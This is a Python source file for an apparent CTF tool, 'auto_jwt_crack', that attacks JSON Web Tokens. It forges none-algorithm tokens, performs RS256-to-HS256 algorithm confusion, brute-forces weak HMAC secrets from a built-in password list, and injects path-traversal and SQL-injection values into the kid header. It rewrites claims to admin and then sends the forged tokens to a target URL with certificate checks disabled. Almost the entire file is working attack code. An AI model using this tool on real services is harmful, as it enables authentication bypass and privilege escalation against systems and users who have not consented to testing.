#!/usr/bin/env python3
"""auto_jwt_crack -- Dedicated JWT attack tool for CTF challenges.

Capabilities:
  - Decode JWT without verification
  - None algorithm attack
  - Algorithm confusion (RS256 -> HS256 using public key as secret)
  - Weak secret brute-force (common passwords + custom wordlist)
  - Kid header injection (../../dev/null, SQL injection in kid)
  - JKU/X5U header injection
  - Forge tokens with modified claims

Outputs EXTRACTED FLAG: <flag> on success.
"""
import argparse
import base64
import hashlib
import hmac
import json
import os
import re
import sys
import time

try:
    import jwt as pyjwt
    _HAS_JWT = True
except ImportError:
    _HAS_JWT = False

try:
    import requests
    _HAS_REQUESTS = True
except ImportError:
    _HAS_REQUESTS = False


# ---------------------------------------------------------------------------
# JWT encoding/decoding helpers
# ---------------------------------------------------------------------------

def _b64url_decode(data: str) -> bytes:
    """Base64url decode with padding."""
    padding = 4 - len(data) % 4
    if padding != 4:
        data += "=" * padding
    return base64.urlsafe_b64decode(data)


def _b64url_encode(data: bytes) -> str:
    """Base64url encode without padding."""
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _decode_jwt(token: str) -> tuple[dict, dict, str]:
    """Decode JWT into (header, payload, signature) without verification."""
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError(f"Invalid JWT: expected 3 parts, got {len(parts)}")

    header = json.loads(_b64url_decode(parts[0]))
    payload = json.loads(_b64url_decode(parts[1]))
    signature = parts[2]

    return header, payload, signature


def _encode_jwt(header: dict, payload: dict, secret: str | bytes = "",
                algorithm: str = "HS256") -> str:
    """Encode a JWT with given header, payload, and secret."""
    header_b64 = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{header_b64}.{payload_b64}"

    if algorithm.lower() == "none" or not algorithm:
        return f"{signing_input}."

    if isinstance(secret, str):
        secret = secret.encode()

    if algorithm == "HS256":
        sig = hmac.new(secret, signing_input.encode(), hashlib.sha256).digest()
    elif algorithm == "HS384":
        sig = hmac.new(secret, signing_input.encode(), hashlib.sha384).digest()
    elif algorithm == "HS512":
        sig = hmac.new(secret, signing_input.encode(), hashlib.sha512).digest()
    else:
        raise ValueError(f"Unsupported algorithm for manual signing: {algorithm}")

    sig_b64 = _b64url_encode(sig)
    return f"{signing_input}.{sig_b64}"


# ---------------------------------------------------------------------------
# Flag extraction
# ---------------------------------------------------------------------------

def _extract_flags(text: str, prefix: str = "flag") -> list[str]:
    """Find flag patterns in text."""
    if not text:
        return []
    patterns = [
        re.compile(rf'{re.escape(prefix)}\{{[A-Za-z0-9_\-\.]+\}}'),
        re.compile(r'[a-zA-Z_]{2,20}\{[^}]{3,100}\}'),
    ]
    flags = []
    seen = set()
    for pat in patterns:
        for m in pat.finditer(text):
            f = m.group(0)
            if f not in seen:
                seen.add(f)
                flags.append(f)
    return flags


# ---------------------------------------------------------------------------
# Attack methods
# ---------------------------------------------------------------------------

def attack_none_algorithm(token: str) -> list[str]:
    """Create tokens with 'none' algorithm variants."""
    header, payload, _ = _decode_jwt(token)
    results = []

    none_variants = ["none", "None", "NONE", "nOnE", "noNe"]

    for alg in none_variants:
        new_header = dict(header)
        new_header["alg"] = alg

        header_b64 = _b64url_encode(json.dumps(new_header, separators=(",", ":")).encode())
        payload_b64 = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())

        # With empty signature
        results.append(f"{header_b64}.{payload_b64}.")
        # Without trailing dot
        results.append(f"{header_b64}.{payload_b64}")

    return results


def attack_alg_confusion(token: str, public_key: str) -> list[str]:
    """Algorithm confusion: RS256 -> HS256 using public key as HMAC secret."""
    header, payload, _ = _decode_jwt(token)
    results = []

    if header.get("alg", "").startswith("RS"):
        print("[*] RS* algorithm detected -- trying confusion to HS256")

        # Read public key
        try:
            if os.path.isfile(public_key):
                with open(public_key, "r") as f:
                    key_data = f.read()
            else:
                key_data = public_key
        except Exception as e:
            print(f"[-] Error reading public key: {e}")
            return results

        new_header = dict(header)
        new_header["alg"] = "HS256"

        # Sign with public key as HMAC secret
        # Try both raw key and stripped PEM key
        key_variants = [
            key_data.encode(),
            key_data.strip().encode(),
            # Remove PEM headers
            re.sub(r'-----[A-Z ]+-----', '', key_data).replace('\n', '').encode(),
        ]

        for key_bytes in key_variants:
            try:
                forged = _encode_jwt(new_header, payload, key_bytes, "HS256")
                results.append(forged)
            except Exception:
                pass

    return results


def attack_weak_secret(token: str, wordlist_path: str | None = None,
                       max_tries: int = 50000) -> tuple[str | None, str | None]:
    """Brute-force weak JWT secret.

    Returns (secret, forged_token) or (None, None).
    """
    header, payload, signature = _decode_jwt(token)
    alg = header.get("alg", "HS256")

    if not alg.startswith("HS"):
        print(f"[-] Algorithm {alg} not suitable for secret brute-force")
        return None, None

    # Build wordlist
    words = [
        # Most common JWT secrets
        "secret", "password", "123456", "admin", "key", "jwt_secret",
        "s3cr3t", "supersecret", "changeme", "test", "default",
        "qwerty", "letmein", "welcome", "monkey", "dragon",
        "master", "login", "princess", "abc123", "iloveyou",
        "", "null", "true", "false", "undefined",
        "your-256-bit-secret", "my-secret-key", "jwt-secret",
        "HS256-secret", "secretkey", "signing-key",
        "private", "private-key", "token", "jwt", "auth",
        "authentication", "Authorization", "bearer",
        "shhh", "shhhh", "ssh", "pass", "passw0rd",
        "p@ssw0rd", "p@$$w0rd", "P@ssw0rd", "hunter2",
        "trustno1", "batman", "shadow", "sunshine",
        "1234567890", "abcdef", "12345678", "qwerty123",
        "hello", "world", "foobar", "foo", "bar", "baz",
        "gfhjkm", "1q2w3e4r", "qwe123", "zxcvbnm",
        "node", "express", "flask", "django", "spring",
        "kubernetes", "docker", "dev", "development", "production",
        "staging", "qa", "testing", "debug", "release",
    ]

    # Add from wordlist file
    if wordlist_path and os.path.isfile(wordlist_path):
        try:
            with open(wordlist_path, "r", errors="replace") as f:
                for i, line in enumerate(f):
                    if i >= max_tries:
                        break
                    word = line.strip()
                    if word and word not in words:
                        words.append(word)
            print(f"[*] Loaded {len(words)} words from wordlist")
        except Exception as e:
            print(f"[-] Error loading wordlist: {e}")

    print(f"[*] Brute-forcing {alg} secret with {len(words)} candidates...")

    # Pre-compute signing input
    parts = token.split(".")
    signing_input = f"{parts[0]}.{parts[1]}".encode()
    target_sig = _b64url_decode(parts[2])

    # Select hash function
    if alg == "HS256":
        hash_func = hashlib.sha256
    elif alg == "HS384":
        hash_func = hashlib.sha384
    elif alg == "HS512":
        hash_func = hashlib.sha512
    else:
        return None, None

    start_time = time.time()
    for i, word in enumerate(words):
        key = word.encode()
        computed = hmac.new(key, signing_input, hash_func).digest()
        if hmac.compare_digest(computed, target_sig):
            elapsed = time.time() - start_time
            print(f"[+] SECRET FOUND: {word!r} (tried {i + 1} in {elapsed:.1f}s)")
            return word, None
        if (i + 1) % 10000 == 0:
            print(f"[*] Tried {i + 1}/{len(words)}...")

    elapsed = time.time() - start_time
    print(f"[-] Secret not found after {len(words)} attempts ({elapsed:.1f}s)")
    return None, None


def attack_kid_injection(token: str) -> list[str]:
    """Forge tokens with kid header injection."""
    header, payload, _ = _decode_jwt(token)
    results = []

    kid_payloads = [
        # File traversal -- sign with empty key
        ("../../dev/null", b"", "HS256"),
        ("../../../dev/null", b"", "HS256"),
        ("/dev/null", b"", "HS256"),
        # Sign with known content
        ("../../etc/hostname", None, "HS256"),
        # SQL injection in kid (for DB-backed key stores)
        ("' UNION SELECT 'AAAA' -- ", b"AAAA", "HS256"),
        ("' UNION SELECT '' -- ", b"", "HS256"),
        ("none", b"none", "HS256"),
    ]

    for kid_val, secret, alg in kid_payloads:
        if secret is None:
            continue  # Can't predict content
        new_header = dict(header)
        new_header["kid"] = kid_val
        new_header["alg"] = alg

        try:
            forged = _encode_jwt(new_header, payload, secret, alg)
            results.append(forged)
        except Exception:
            pass

    return results


def forge_admin_token(token: str, secret: str) -> str:
    """Create a forged admin JWT with known secret."""
    header, payload, _ = _decode_jwt(token)
    alg = header.get("alg", "HS256")

    # Modify claims to escalate privileges
    modified = dict(payload)
    privilege_mods = {
        "admin": True, "is_admin": True, "isAdmin": True,
        "role": "admin", "roles": ["admin"],
        "user": "admin", "username": "admin", "sub": "admin",
        "privilege": "admin", "level": 9999,
        "authorized": True, "auth": True,
    }

    for key, val in privilege_mods.items():
        if key in modified:
            modified[key] = val

    # If no privilege fields found, add common ones
    if not any(k in modified for k in privilege_mods):
        modified["admin"] = True
        modified["role"] = "admin"

    return _encode_jwt(header, modified, secret, alg)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(
        description="Kraken JWT Cracker -- none alg, weak secret, kid injection, alg confusion",
    )
    parser.add_argument("--token", required=True, help="JWT token to attack")
    parser.add_argument("--prefix", default="flag", help="Flag prefix (default: flag)")
    parser.add_argument("--url", default=None, help="Target URL to test forged tokens")
    parser.add_argument("--cookie-name", default=None, help="Cookie name for JWT")
    parser.add_argument("--header-name", default=None, help="Header name for JWT (e.g., Authorization)")
    parser.add_argument("--public-key", default=None, help="Public key file for alg confusion")
    parser.add_argument("--wordlist", default=None, help="Wordlist file for secret brute-force")
    parser.add_argument("--forge-only", action="store_true", help="Only forge tokens, don't test")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout")
    args = parser.parse_args()

    token = args.token.strip()
    prefix = args.prefix

    # Step 1: Decode and display
    print(f"[*] JWT Token: {token[:60]}...")
    try:
        header, payload, signature = _decode_jwt(token)
        print(f"[*] Header:  {json.dumps(header)}")
        print(f"[*] Payload: {json.dumps(payload)}")
        print(f"[*] Signature: {signature[:20]}...")
    except Exception as e:
        print(f"[-] Failed to decode JWT: {e}", file=sys.stderr)
        sys.exit(1)

    # Check if payload already contains flag
    payload_str = json.dumps(payload)
    flags = _extract_flags(payload_str, prefix)
    if flags:
        print(f"\nEXTRACTED FLAG: {flags[0]}")
        sys.exit(0)

    # Collect all forged tokens
    forged_tokens: list[tuple[str, str]] = []  # (description, token)

    # Step 2: None algorithm attack
    print("\n[*] === None Algorithm Attack ===")
    none_tokens = attack_none_algorithm(token)
    for nt in none_tokens:
        forged_tokens.append(("none-alg", nt))
    print(f"[+] Generated {len(none_tokens)} none-alg tokens")

    # Also forge admin versions
    for alg_name in ["none", "None", "NONE"]:
        modified = dict(payload)
        for key in ["admin", "is_admin", "isAdmin", "role"]:
            if key in modified:
                if key == "role":
                    modified[key] = "admin"
                else:
                    modified[key] = True
        if "sub" in modified:
            modified["sub"] = "admin"
        if "user" in modified:
            modified["user"] = "admin"
        if "username" in modified:
            modified["username"] = "admin"
        # Add admin if not present
        if not any(k in modified for k in ["admin", "is_admin", "role"]):
            modified["admin"] = True
            modified["role"] = "admin"

        new_header = dict(header)
        new_header["alg"] = alg_name
        header_b64 = _b64url_encode(json.dumps(new_header, separators=(",", ":")).encode())
        payload_b64 = _b64url_encode(json.dumps(modified, separators=(",", ":")).encode())
        forged_tokens.append(("none-alg-admin", f"{header_b64}.{payload_b64}."))

    # Step 3: Kid injection
    print("\n[*] === Kid Injection Attack ===")
    kid_tokens = attack_kid_injection(token)
    for kt in kid_tokens:
        forged_tokens.append(("kid-injection", kt))
    print(f"[+] Generated {len(kid_tokens)} kid-injection tokens")

    # Step 4: Algorithm confusion (if public key provided)
    if args.public_key:
        print("\n[*] === Algorithm Confusion Attack ===")
        confusion_tokens = attack_alg_confusion(token, args.public_key)
        for ct in confusion_tokens:
            forged_tokens.append(("alg-confusion", ct))
        print(f"[+] Generated {len(confusion_tokens)} confusion tokens")

    # Step 5: Weak secret brute-force
    print("\n[*] === Weak Secret Brute-Force ===")
    secret, _ = attack_weak_secret(token, args.wordlist)
    if secret is not None:
        admin_token = forge_admin_token(token, secret)
        forged_tokens.insert(0, ("cracked-admin", admin_token))
        # Also forge with exact same claims (for endpoints that just verify signature)
        original_forged = _encode_jwt(header, payload, secret, header.get("alg", "HS256"))
        forged_tokens.insert(0, ("cracked-original", original_forged))
        print(f"[+] Forged admin token with secret: {secret!r}")

    # Step 6: Test forged tokens against URL
    if args.url and _HAS_REQUESTS and not args.forge_only:
        print(f"\n[*] === Testing {len(forged_tokens)} forged tokens against {args.url} ===")

        session = requests.Session()
        session.verify = False
        try:
            import urllib3
            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        except Exception:
            pass

        test_paths = ["", "/flag", "/admin", "/dashboard", "/api/flag",
                      "/profile", "/secret", "/api/admin"]

        for desc, forged in forged_tokens:
            for path in test_paths:
                test_url = args.url.rstrip("/") + path

                try:
                    if args.cookie_name:
                        session.cookies.set(args.cookie_name, forged)
                        resp = session.get(test_url, timeout=args.timeout)
                    elif args.header_name:
                        hdr_val = forged
                        if args.header_name.lower() == "authorization":
                            hdr_val = f"Bearer {forged}"
                        resp = session.get(test_url, timeout=args.timeout,
                                           headers={args.header_name: hdr_val})
                    else:
                        # Try both cookie and Authorization header
                        resp = session.get(test_url, timeout=args.timeout,
                                           headers={"Authorization": f"Bearer {forged}"})
                        flags = _extract_flags(resp.text, prefix)
                        if not flags:
                            # Try as cookie named "token"
                            session.cookies.set("token", forged)
                            resp = session.get(test_url, timeout=args.timeout)
                            session.cookies.clear()
                except Exception:
                    continue

                if resp:
                    flags = _extract_flags(resp.text, prefix)
                    if flags:
                        print(f"[+] {desc} at {path} -- FLAG FOUND!")
                        print(f"\nEXTRACTED FLAG: {flags[0]}")
                        sys.exit(0)

                    # Check headers and cookies
                    for hv in resp.headers.values():
                        flags = _extract_flags(hv, prefix)
                        if flags:
                            print(f"\nEXTRACTED FLAG: {flags[0]}")
                            sys.exit(0)

    # Output results
    print(f"\n[*] Summary: {len(forged_tokens)} forged tokens generated")
    if secret is not None:
        print(f"[+] JWT Secret: {secret!r}")
    if forged_tokens:
        print(f"\n[*] Best forged token ({forged_tokens[0][0]}):")
        print(forged_tokens[0][1])
    else:
        print("[-] No viable attack vectors found")

    # No flag found via URL testing
    if not args.url:
        print("\n[-] No --url provided; use forged tokens manually")
    print("\n[-] No flag extracted", file=sys.stderr)
    sys.exit(1)


if __name__ == "__main__":
    main()
